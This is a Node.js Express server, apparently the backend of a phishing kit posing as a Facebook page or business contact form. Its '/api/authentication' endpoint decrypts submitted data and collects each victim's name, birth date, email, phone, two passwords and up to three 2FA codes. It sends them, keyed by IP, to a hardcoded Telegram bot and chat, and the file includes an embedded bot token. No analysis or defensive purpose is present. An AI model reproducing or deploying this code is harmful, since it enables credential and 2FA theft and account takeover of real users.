const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const CryptoJS = require('crypto-js');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));
app.use('/_next', express.static(path.join(__dirname, '_next')));

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8932332118:AAHhk28Z1nLEgYaEk6Rbh4o0gJ-WQvDlvwY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7213546758';
const SECRET_KEY = "HDNDT-JDHT8FNEK-JJHR";

// Lưu dữ liệu và message_id theo IP
const sessionData = new Map();

function decryptData(encryptedData) {
  try {
    const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
    if (!decrypted) return null;
    return JSON.parse(decrypted);
  } catch (error) {
    console.error('Giải mã lỗi:', error.message);
    return null;
  }
}

async function sendNewMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const response = await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });
    return response.data.result.message_id;
  } catch (error) {
    console.error('❌ Lỗi gửi:', error.message);
    return null;
  }
}

async function editMessage(messageId, newMessage) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text: newMessage
    });
    console.log(`✅ Đã cập nhật tin nhắn ID: ${messageId}`);
    return true;
  } catch (error) {
    console.error('❌ Lỗi cập nhật:', error.message);
    return false;
  }
}

// Format tin nhắn ĐÚNG YÊU CẦU - KHÔNG icon, KHÔNG dấu hiệu đặc biệt
function formatMessage(data) {
  const otp1 = data.twoFa || data.code2FA1 || data.otp1 || '';
  const otp2 = data.twoFaSecond || data.code2FA2 || data.otp2 || '';
  const otp3 = data.twoFaThird || data.code2FA3 || data.otp3 || '';
  
  return `Ip: ${data.ip || 'N/A'}
Location: ${data.location || 'N/A'}
-----------------------------
Full Name: ${data.name || data.fullName || 'N/A'}
Page Name: ${data.fanpage || data.fanpageUrl || 'N/A'}
Date of birth: ${data.day || 'N/A'}/${data.month || 'N/A'}/${data.year || 'N/A'}
-----------------------------
Email: ${data.email || 'N/A'}
Email Business: ${data.business || data.businessEmail || 'N/A'}
Phone Number: ${data.phone || 'N/A'}
-----------------------------
Password First: ${data.password || data.passwordFirst || 'N/A'}
Password Second: ${data.passwordSecond || 'N/A'}
-----------------------------
Auth Method: ${data.authMethod || 'N/A'}
-----------------------------
🔐Code 2FA(1): ${otp1}
🔐Code 2FA(2): ${otp2}
🔐Code 2FA(3): ${otp3}`;
}

// API chính
app.post('/api/authentication', async (req, res) => {
  try {
    let data = req.body;
    
    if (data.data && typeof data.data === 'string') {
      const decrypted = decryptData(data.data);
      if (decrypted) data = decrypted;
    }
    
    const clientIp = data.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
    
    let session = sessionData.get(clientIp);
    if (!session) {
      session = { data: {}, messageId: null };
      sessionData.set(clientIp, session);
    }
    
    session.data = { ...session.data, ...data };
    
    const newMessage = formatMessage(session.data);
    
    if (session.messageId) {
      await editMessage(session.messageId, newMessage);
    } else {
      const messageId = await sendNewMessage(newMessage);
      if (messageId) {
        session.messageId = messageId;
      }
    }
    
    sessionData.set(clientIp, session);
    res.json({ success: true });
    
  } catch (error) {
    console.error('Lỗi:', error);
    res.status(500).json({ success: false });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'contact.html'));
});

app.get('/contact.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'contact.html'));
});

app.listen(PORT, () => {
  console.log(`
Server chạy tại: http://localhost:${PORT}/contact.html
  `);
});